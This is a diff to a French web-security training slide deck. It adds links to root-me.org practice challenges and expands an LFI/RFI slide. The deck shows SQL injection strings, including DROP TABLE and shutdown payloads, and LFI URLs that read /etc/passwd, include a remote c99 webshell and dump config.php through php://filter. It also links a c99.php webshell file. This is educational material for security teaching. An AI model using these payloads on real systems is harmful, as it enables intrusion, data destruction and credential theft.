@@ -58,7 +58,7 @@
 					<section>
 						<h2>Définition</h2>
 						<p>Les principes de la sécurité des application sont l'ensemble des propriétés, des comportements, des conceptions et des pratiques de mise en œuvre qui visent à réduire la probabilité du succès d'une attaque et l'impact de celle-ci . Les principes de sécurité sont indépendants du language et de l'architecture, et peuvent être utilisés dans la plupart des méthodologies de développement de logiciels pour concevoir et construire des applications sécurisées.</p>
-						<a href="https://www.owasp.org/index.php/Category:Principle">owasp</a>
+						<a target="_blank" href="https://www.owasp.org/index.php/Category:Principle">owasp</a>
 					</section>
 					<section>
 						<h2>Les principes de bases</h2>
@@ -113,7 +113,7 @@
 						<p>
 							Google comporte des <em>easter eggs</em> qui sont devenus des filtres très utiles pour repérer des sites vulnérables.
 							
-							<a href="http://www.googleguide.com/advanced_operators_reference.html">http://www.googleguide.com/advanced_operators_reference.html</a>
+							<a target="_blank" href="http://www.googleguide.com/advanced_operators_reference.html">http://www.googleguide.com/advanced_operators_reference.html</a>
 						</p>
 					</section>
 					<section>
@@ -234,6 +234,7 @@ http://exemple.com/pdf
 http://exemple.com/document
 http://exemple.com/upload
 						</code></pre>
+						<p><a target="_blank" href="http://challenge01.root-me.org//web-serveur/ch15/ch15.php">Challenge Traversal directory</a></p>
 					</section>
 					<section>
 						<h2><em>Traversal directory</em> - Solution</h2>
@@ -311,7 +312,7 @@ http://exemple.com/upload
 						<h2><em>HTTP verb Tampering</em></h2>
 						<p>
 							Cette attaque permet de contourner (<em>by-pass</em>) une authentification HTTP basique si les .htaccess et le serveur ont été mal paramétrés.
-							
+							<a target="_blank" href="http://challenge01.root-me.org//web-serveur/ch8">Challenge HTTP Verb Tampering</a>
 						</p>
 					</section>
 
@@ -395,10 +396,10 @@ $user = $query->execute();
                         <p>
 							Maintenant, si a la place de <code data-trim class="php">$password</code> l'attaquant met :
                         </p>
-							<pre><code data-trim class="php">' OR '1'='1</code></pre>
-							<pre><code data-trim class="sql">SELECT * from FROM users WHERE username='admin' OR '1'='1' AND password='' </code></pre>
-							<pre><code data-trim class="sql">' OR 1=1"); DROP TABLE users; </code></pre>
-							<pre><code data-trim class="sql">'; shutdown with nowait; -- </code></pre>
+						<pre><code data-trim class="php">' OR '1'='1</code></pre>
+						<pre><code data-trim class="sql">SELECT * from FROM users WHERE username='admin' OR '1'='1' AND password='' </code></pre>
+						<pre><code data-trim class="sql">' OR 1=1"); DROP TABLE users; </code></pre>
+						<pre><code data-trim class="sql">'; shutdown with nowait; -- </code></pre>
 					</section>
 					<section>
 					<h2>Injections SQL - Exemple 2</h2>
@@ -423,9 +424,13 @@ $user = $query->execute();
 							<li>Exécuter des commandes systèmes</li>
 						</ul>
                         <p>
-                            <a href="http://www.cgsecurity.org/Articles/sql_injection/">http://www.cgsecurity.org/Articles/sql_injection/</a>
-							<a href="https://www.owasp.org/index.php/Blind_SQL_Injection">https://www.owasp.org/index.php/Blind_SQL_Injection</a>
+                            <a target="_blank" href="http://www.cgsecurity.org/Articles/sql_injection/">http://www.cgsecurity.org/Articles/sql_injection/</a>
+							<a target="_blank" href="https://www.owasp.org/index.php/Blind_SQL_Injection">https://www.owasp.org/index.php/Blind_SQL_Injection</a>
 						</p>
+					</section>
+					<section>
+						<h2>Challenge Injection sql</h2>
+						<p><a target="_blank" href="http://challenge01.root-me.org//web-serveur/ch9/">Challenge injection sql</a></p>
 					</section>
 					<section>
 						<h2>Injections SQL - Solutions</h2>
@@ -454,7 +459,7 @@ $user = $query->execute();
 					<section>
 						<h2>Injection PHP- <em>Register</em> global</h2>
 						<p>
-							La faille de sécurité "<em>Register</em> global" vient d'une configuration de PHP <a href="http://php.net/manual/fr/security.globals.php"><em>register_globals</em></a> qui, si elle est activée peut faciliter la création de failles.
+							La faille de sécurité "<em>Register</em> global" vient d'une configuration de PHP <a target="_blank" href="http://php.net/manual/fr/security.globals.php"><em>register_globals</em></a> qui, si elle est activée peut faciliter la création de failles.
 							Si le <em>register_globals</em> a la valeur '<em>On</em>' alors toutes les variables $_GET, $_POST, $_SERVER sont diponibles sous la forme de variables PHP.
                         </p>
                         <pre><code data-trim class="php">
@@ -462,7 +467,6 @@ $user = $query->execute();
 $username    == $_POST['username']
 $username    == $_GET['username']
 $username    == $_SESSION['username']
-$httpReferer == $_SERVER['HTTP_REFERER']
                         </code></pre>
 
 						<aside class="notes">
@@ -487,7 +491,7 @@ if($logged){
                         <pre><code data-trim class="php">
                             http://example.com/admin?logged=1
                         </code></pre>
-
+                        <p><a target="_blank" href="http://challenge01.root-me.org//web-serveur/ch17/">Challenge Register global</a></p>
 					</section>
 					<section>
 						<h2><em>Register</em> global - Solution</h2>
@@ -574,6 +578,10 @@ while($continuer)
 	document.body.appendChild(imgTag);
 &lt;/script&gt;
 						</code></pre>
+					</section>
+					<section>
+						<h2>Challenge XSS</h2>
+						<p><a target="_blank" href="http://challenge01.root-me.org//web-client/ch18/">Challenge XSS</a></p>
 					</section>
 					<section>
 						<h2>Injection XSS - Solution</h2>
@@ -685,6 +693,11 @@ Content-Type: image/jpeg\r\n\r\n<?php\necho 'powned';\n?>\r\n
                             <li>Vérifier le <em>mime-type</em> avec <em>getimagesize()</em> et l’extension du fichier.</li>
 						</ul>
 					</section>
+					<section>
+						<h2>Upload - Challenges</h2>
+						<p><a target="_blank" href="http://challenge01.root-me.org/web-serveur/ch22/">Null byte</a></p>
+						<p><a target="_blank" href="http://challenge01.root-me.org/web-serveur/ch21/">Mime type</a></p>
+					</section>
 				</section>
 
 				<section>
@@ -699,21 +712,33 @@ Content-Type: image/jpeg\r\n\r\n<?php\necho 'powned';\n?>\r\n
 						<h2>Faille LFI/RFI</h2>
 						<pre><code class="php">$incfile = $_REQUEST["file"];
 include($incfile.".php");</code></pre>
-						<p>
-							
-						</p>
+						<p>Appel normal de l'url : </p>
+						<pre><code>http://vulnerable/?file=index</code></pre>	
+						<p>Appel avec un fichier local : </p>
+						<pre><code>http://vulnerable/?file=/etc/password%00</code></pre>	
+						<p>Appel avec un fichier distant : </p>
+						<pre><code>http://vulnerable/?file=http://c99.php%00</code></pre>
+						<p>Appel avec des filters pour récupérer les sources du fichier config.php : </p>						
+						<pre><code>http://vulnerable/?file=php://filter/read=convert.base64-encode/resource=config.php</code></pre>
+						<p>Un exemple de fichier php qui peut créer des dégats : <a target="_blank" href="images/c99.php">C99</a></p>	
+					</section>
+					<section>
+						<h2>LFI - Challenge</h2>
+						<p><a target="_blank" href="http://challenge01.root-me.org/web-serveur/ch16/">LFI challenge</a></p>
+						<p><a target="_blank" href="http://challenge01.root-me.org/web-serveur/ch12">LFI php filter</a></p>
 					</section>
 				</section>
 				<section>
 					<h2>La boite à outils</h2>
 
                     <ul>
-                        <li><a href="https://code.google.com/p/patator/">Patator brute-forcer</a></li>
-                        <li><a href="http://dotdotpwn.sectester.net/">dotdotpwn - Directory Traversal Fuzzer</a></li>
-                        <li><a href="http://sqlmap.org/">SQLMap</a></li>
-                        <li><a href="https://www.owasp.org/index.php/Category:OWASP_SQLiX_Project">SQLiX</a></li>
-                        <li>Tamper Data</li>
-                        <li>fimap</li>
+                        <li><a target="_blank" href="https://code.google.com/p/patator/">Patator brute-forcer</a></li>
+                        <li><a target="_blank" href="http://dotdotpwn.sectester.net/">dotdotpwn - Directory Traversal Fuzzer</a></li>
+                        <li><a target="_blank" href="http://sqlmap.org/">SQLMap</a></li>
+                        <li><a target="_blank" href="https://www.owasp.org/index.php/Category:OWASP_SQLiX_Project">SQLiX</a></li>
+                        <li><a target="_blank" href="https://addons.mozilla.org/fr/firefox/addon/tamper-data/">Tamper Data</a></li>
+                        <li><a target="_blank" href="https://code.google.com/p/fimap/">fimap</a></li>
+                        <li><a target="_blank" href="https://www.pentesterlab.com/">Pentester Lab</a></li>
                     </ul>
 
 				</section>
